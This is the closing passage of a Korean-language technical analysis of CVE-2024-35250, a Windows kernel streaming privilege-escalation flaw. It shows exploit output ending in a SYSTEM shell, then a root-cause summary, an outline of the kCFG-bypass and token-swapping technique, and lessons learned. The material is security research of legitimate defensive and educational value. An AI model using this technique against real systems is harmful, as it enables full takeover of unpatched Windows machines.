[+] Current KTHREAD address: ffffb48746409080
[+] Current EPROCESS: 0xffffb487475db080
[+] ptr_ArbitraryFunCall (jmp rax) = FFFFF807069F26F0
[+] RCX will point to: 0000000010000000
[+] Exploit complete. Spawning SYSTEM shell.

Microsoft Windows [Version 10.0.22621.3447]
(c) Microsoft Corporation. All rights reserved.

C:\Users\user>whoami
nt authority\system
```

`whoami` 명령어 실행 결과, 현재 프로세스가 **NT AUTHORITY\SYSTEM** 권한으로 실행됨을 확인할 수 있다. 커널 구조체 수정과 Token Swapping이 모두 의도대로 동작했음을 입증한다.

---

## 5. 결론

### 5.1 취약점 요약

CVE-2024-35250은 Windows 커널 스트리밍 드라이버(ks.sys)의 `UnserializePropertySet` 함수에서 발생하는 **신뢰 경계 위반** 취약점이다.

| 항목 | 내용 |
|---|---|
| **취약점 유형** | 신뢰되지 않은 포인터 역참조 (CWE-822) |
| **영향** | 로컬 권한 상승 (LPE) |
| **근본 원인** | IOCTL 재호출 시 RequestorMode를 KernelMode로 설정하여 사용자 데이터에 대한 검증 우회 |
| **Exploit 방식** | kCFG 우회 가젯을 통한 PreviousMode 변조 → Token Swapping |

### 5.2 기술적 성과

본 분석에서는 다음과 같은 기술적 성과를 달성했다.

1. **Root Cause 분석**: 커널 스트리밍 아키텍처의 IRP 처리 흐름을 추적하여 취약점의 근본 원인을 정확히 식별
2. **kCFG 우회 가젯 발굴**: 기존에 알려진 RTL_BITMAP 기반 방식 외에, `DbgkpTriageDumpRestoreState`와 `ExpProfileDelete` 함수를 활용한 새로운 Arbitrary Write Primitive 구성
3. **안정적인 Exploit 개발**: Windows 보호 기법(kASLR, SMEP, kCFG)을 모두 우회하는 완전한 LPE Exploit 구현

### 5.3 배운 점

이번 분석을 통해 다음과 같은 Windows 커널 보안에 대한 깊은 이해를 얻을 수 있었다.

- **신뢰 경계의 중요성**: 커널 코드에서 사용자 데이터를 다룰 때는 항상 데이터의 출처를 고려하여 적절한 검증을 수행해야 한다
- **RequestorMode의 의미**: 이 필드는 IRP 생성자의 모드를 나타내지만, 포함된 데이터의 신뢰도와는 별개임을 이해해야 한다
- **kCFG 우회 기법**: 간접 호출 보호가 적용된 환경에서도 등록된 함수의 기능을 활용하여 공격이 가능함을 확인

---

## 참고 자료

- [Microsoft: IoBuildDeviceIoControlRequest function (wdm.h)](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest)
- [MSRC: CVE-2024-35250](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250)
- [Windows Kernel Streaming Architecture](https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/)